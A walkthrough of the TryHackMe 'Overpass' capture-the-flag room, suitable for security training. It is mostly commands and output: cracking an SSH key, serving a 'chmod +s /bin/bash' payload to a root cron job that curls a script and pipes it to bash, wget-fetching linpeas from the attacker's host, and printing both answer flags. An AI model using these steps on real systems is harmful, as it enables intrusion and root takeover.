# Overpass

What happens when some broke CompSci students make a password manager?

[Overpass](https://tryhackme.com/room/overpass)

## Topic's

- Network Enumeration
- Web Enumeration
- Web Poking
- Cookie Manipulation
- Brute Forcing (SSH)
- Cryptography
  - ROT47
- Linux Enumeration
- Exploiting Crontab
- Abusing SUID/GUID
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Overpass

What happens when a group of broke Computer Science students try to make a password manager?
Obviously a perfect commercial success!

There is a TryHackMe subscription code hidden on this box. The first person to find and activate it will get a one month subscription for free! If you're already a subscriber, why not give the code to a friend?

UPDATE: The code is now claimed.
The machine was slightly modified on 2020/09/25. This was only to improve the performance of the machine. It does not affect the process.

```
kali@kali:~/CTFs/tryhackme/Overpass$ sudo nmap -p- -sC -sV -Pn 10.10.134.43
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 17:16 CEST
Nmap scan report for 10.10.134.43
Host is up (0.040s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.35 seconds
```

```
kali@kali:~/CTFs/tryhackme/Overpass$ gobuster dir -u http://10.10.134.43/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.134.43/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/05 17:18:08 Starting gobuster
===============================================================
/img (Status: 301)
/downloads (Status: 301)
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/http%3A%2F%2Fwww (Status: 301)
/http%3A%2F%2Fyoutube (Status: 301)
/http%3A%2F%2Fblogs (Status: 301)
/http%3A%2F%2Fblog (Status: 301)
/**http%3A%2F%2Fwww (Status: 301)
Progress: 83630 / 220561 (37.92%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/05 17:22:48 Finished
===============================================================
```

- [http://10.10.134.43/admin/](http://10.10.134.43/admin/)
- [view-source:http://10.10.134.43/main.js](view-source:http://10.10.134.43/main.js)
- [view-source:http://10.10.134.43/login.js](view-source:http://10.10.134.43/login.js)

```js
async function login() {
  const usernameBox = document.querySelector("#username");
  const passwordBox = document.querySelector("#password");
  const loginStatus = document.querySelector("#loginStatus");
  loginStatus.textContent = "";
  const creds = { username: usernameBox.value, password: passwordBox.value };
  const response = await postData("/api/login", creds);
  const statusOrCookie = await response.text();
  if (statusOrCookie === "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials";
    passwordBox.value = "";
  } else {
    Cookies.set("SessionToken", statusOrCookie);
    window.location = "/admin";
  }
}
```

`SessionToken`

![](2020-10-05_17-21.png)

![](2020-10-05_17-22.png)

```
Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox
```

`James`

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----

```

```
kali@kali:~/CTFs/tryhackme/Overpass$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)
1g 0:00:00:12 97.36% (ETA: 17:26:53) 0.08312g/s 1162Kp/s 1162Kc/s 1162KC/s 05981839..059815574
Session aborted
```

`james13`

```
kali@kali:~/CTFs/tryhackme/Overpass$ chmod 600 id_rsa
kali@kali:~/CTFs/tryhackme/Overpass$ ssh -i id_rsa james@10.10.134.43
```

1. Hack the machine and get the flag in user.txt

```
james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}
james@overpass-prod:~$
```

`thm{65c1aaf000506e56996822c6281e6bf7}`

2. Escalate your privileges and get the flag in root.txt

```
james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

```go
//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
func rot47(input string) string {
	var result []string
	for i := range input[:len(input)] {
		j := int(input[i])
		if (j >= 33) && (j <= 126) {
			result = append(result, string(rune(33+((j+14)%94))))
		} else {
			result = append(result, string(input[i]))
		}
	}
	return strings.Join(result, "")
}
```

```go
credsPath, err := homedir.Expand("~/.overpass")
```

```
james@overpass-prod:~$ cat .overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```

- [ROT-47 Cipher](https://www.dcode.fr/rot-47-cipher)

`[{"name":"System","pass":"saydrawnlyingpicture"}]`

```
kali@kali:~/CTFs/tryhackme/Overpass$ cp /usr/share/linpeas/linpeas.sh .
kali@kali:~/CTFs/tryhackme/Overpass$ sudo python3 -m http.server 80
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.134.43 - - [05/Oct/2020 17:42:39] "GET /linpeas.sh HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
kali@kali:~/CTFs/tryhackme/Overpass$
```

```
james@overpass-prod:~$ wget 10.8.106.222/linpeas.sh
--2020-10-05 15:42:40--  http://10.8.106.222/linpeas.sh
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 289937 (283K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh      100%[=====>] 283.14K  1.39MB/s    in 0.2s

2020-10-05 15:42:40 (1.39 MB/s) - ‘linpeas.sh’ saved [289937/289937]

james@overpass-prod:~$ ls
linpeas.sh  todo.txt  user.txt
james@overpass-prod:~$ chmod +x linpeas.sh
james@overpass-prod:~$ ./linpeas.sh
```

```
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

```
kali@kali:~/CTFs/tryhackme/Overpass$ mkdir -p www/downloads/src/
kali@kali:~/CTFs/tryhackme/Overpass$ cd www/
kali@kali:~/CTFs/tryhackme/Overpass/www$ echo -n 'chmod +s /bin/bash' > downloads/src/buildscript.sh
kali@kali:~/CTFs/tryhackme/Overpass/www$ sudo python3 -m http.server 80
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.8.106.222 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

```
james@overpass-prod:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
james@overpass-prod:~$ /bin/bash -p
bash-4.4# ls
linpeas.log  linpeas.sh  todo.txt  user.txt
bash-4.4# cd /root
bash-4.4# ls
buildStatus  builds  go  root.txt  src
bash-4.4# cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
bash-4.4#
```

`thm{7f336f8c359dbac18d54fdd64ea753bb}`
